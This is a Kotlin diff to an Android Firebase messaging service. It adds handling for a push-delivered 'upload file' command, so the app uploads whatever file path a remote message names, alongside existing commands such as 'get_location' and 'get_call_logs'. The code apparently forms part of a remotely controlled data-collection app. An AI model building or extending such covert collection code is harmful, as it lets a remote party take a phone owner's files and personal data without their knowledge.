@@ -5,6 +5,9 @@ import android.util.Log
 import androidx.work.Data
 import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
+import androidx.work.Constraints
+import androidx.work.NetworkType
+import androidx.work.workDataOf
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
 import kotlinx.coroutines.CoroutineScope
@@ -118,7 +121,21 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             when {
                 command != null -> {
                     Log.d(TAG, "Received command: '$command'. Scheduling worker.")
-                    scheduleDataFetchWorker(command)
+                    
+                    // Handle file upload commands with file path
+                    if (command == DataFetchWorker.COMMAND_UPLOAD_FILE) {
+                        val filePath = remoteMessage.data["filePath"]
+                        if (!filePath.isNullOrBlank()) {
+                            Log.d(TAG, "Scheduling file upload for: $filePath")
+                            scheduleFileUploadWorker(command, filePath)
+                        } else {
+                            Log.w(TAG, "Upload file command received without file path")
+                            scheduleDataFetchWorker(command) // Will handle the error appropriately
+                        }
+                    } else {
+                        // Handle standard commands
+                        scheduleDataFetchWorker(command)
+                    }
                 }
                 else -> {
                     Log.w(TAG, "Received FCM message without a '$COMMAND_KEY' key in data.")
@@ -130,26 +147,53 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     }
 
     /**
-     * Schedules a background worker to process the received command.
-     * @param command The command string to be processed by the worker
+     * Schedules a DataFetchWorker to execute the given command.
+     * Uses a coroutine scope tied to the service lifecycle.
+     * @param command The command to execute (e.g., "get_location", "get_call_logs")
      */
     private fun scheduleDataFetchWorker(command: String) {
         try {
-            val workManager = WorkManager.getInstance(applicationContext)
-            val inputData = Data.Builder()
-                .putString(DataFetchWorker.KEY_COMMAND, command)
+            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
+                .setInputData(workDataOf(DataFetchWorker.KEY_COMMAND to command))
+                .setConstraints(
+                    Constraints.Builder()
+                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                        .build()
+                )
                 .build()
 
-            val dataFetchWorkRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
-                .setInputData(inputData)
-                .build()
-
-            workManager.enqueue(dataFetchWorkRequest)
-            Log.d(TAG, "DataFetchWorker scheduled successfully for command: $command")
-
+            WorkManager.getInstance(applicationContext).enqueue(workRequest)
+            Log.d(TAG, "DataFetchWorker scheduled for command: $command")
         } catch (e: Exception) {
-            // Improved: Added error handling for work scheduling
-            Log.e(TAG, "Failed to schedule DataFetchWorker for command: $command", e)
+            Log.e(TAG, "Error scheduling DataFetchWorker for command: $command", e)
+        }
+    }
+
+    /**
+     * Schedules a DataFetchWorker to upload a specific file.
+     * @param command The command to execute
+     * @param filePath The path of the file to upload
+     */
+    private fun scheduleFileUploadWorker(command: String, filePath: String) {
+        try {
+            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
+                .setInputData(
+                    workDataOf(
+                        DataFetchWorker.KEY_COMMAND to command,
+                        "filePath" to filePath
+                    )
+                )
+                .setConstraints(
+                    Constraints.Builder()
+                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                        .build()
+                )
+                .build()
+
+            WorkManager.getInstance(applicationContext).enqueue(workRequest)
+            Log.d(TAG, "File upload worker scheduled for: $filePath")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error scheduling file upload worker for: $filePath", e)
         }
     }
 
